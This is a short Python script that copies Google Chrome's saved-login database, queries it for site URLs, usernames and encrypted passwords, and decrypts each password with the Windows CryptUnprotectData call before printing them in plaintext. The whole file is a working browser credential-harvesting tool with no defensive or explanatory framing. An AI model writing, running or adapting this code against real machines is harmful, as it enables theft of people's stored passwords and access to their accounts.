import sqlite3, win32crypt
from os import getenv
from shutil import copyfile

path = getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login Data"
#Copy in case user is looged in an lock is in operation
path2 = getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login2"
copyfile(path,path2)
#Connect to the DB
conn = sqlite3.connect(path2)
#create cursor for sql commands
cursor = conn.cursor()
cursor.execute("SELECT action_url, username_value, password_value FROM logins")
#Iterate through list for usernames and passwords
for raw in cursor.fetchall():
	print raw[0] + '\n' + raw[1]
	password = win32crypt.CryptUnprotectData(raw[2])[1]
	print password
#Close connection
conn.close()